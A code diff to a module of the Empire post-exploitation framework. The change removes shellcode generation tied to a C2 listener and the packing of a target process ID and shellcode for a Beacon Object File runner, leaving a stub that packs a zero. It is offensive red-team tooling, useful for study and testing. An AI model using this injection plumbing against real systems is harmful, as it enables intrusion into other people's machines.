@@ -4,7 +4,6 @@ import json
 from empire.server.common.empire import MainMenu
 from empire.server.core.module_models import EmpireModule
 from empire.server.utils.bof_packer import Packer
-from empire.server.utils.shellcode_compiler import generate_pic_shellcode
 
 
 class Module:
@@ -16,12 +15,6 @@ class Module:
         obfuscate: bool = False,
         obfuscation_command: str = "",
     ):
-        listener_name = params["Listener"]
-        pid = int(params["pid"])
-        language = params["Language"]
-
-        shellcode = generate_pic_shellcode(main_menu, listener_name, language)
-
         bof_module = main_menu.modulesv2.modules["csharp_code_execution_runcoff"]
         script_file = main_menu.modulesv2.dotnet_compiler.compile_task(
             bof_module.compiler_yaml,
@@ -35,14 +28,12 @@ class Module:
         b64_bof_data = base64.b64encode(bof_data).decode("utf-8")
 
         packer = Packer()
-        packer.addint(pid)
-        packer.addbytes(shellcode)
+        packer.addint(0)
 
-        params_dict = {
-            "Entrypoint": "go",
-            "File": b64_bof_data,
-            "HexData": packer.getbuffer_data(),
-        }
+        params_dict = {}
+        params_dict["Entrypoint"] = "go"
+        params_dict["File"] = b64_bof_data
+        params_dict["HexData"] = packer.getbuffer_data()
 
         base64_json = base64.b64encode(json.dumps(params_dict).encode("utf-8")).decode(
             "utf-8"
